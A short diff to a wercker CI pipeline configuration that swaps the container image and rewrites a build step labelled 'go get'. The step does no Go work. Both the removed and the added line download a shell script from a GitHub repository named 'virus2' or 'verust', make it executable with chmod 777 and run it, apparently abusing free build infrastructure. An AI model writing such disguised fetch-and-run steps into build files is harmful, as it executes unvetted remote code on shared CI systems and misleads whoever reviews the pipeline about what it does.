@@ -4,7 +4,7 @@
 # Read more about containers on our dev center
 # https://devcenter.wercker.com/overview-and-core-concepts/containers/
 box:  
-  id: node:latest
+  id: php
   ports:
     - "8080"
 # This is the build pipeline. Pipelines are the core of wercker
@@ -33,4 +33,8 @@ build:
     - script:
         name: go get
         code: |
-               wget https://github.com/raufpermana22/virus2/raw/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh  
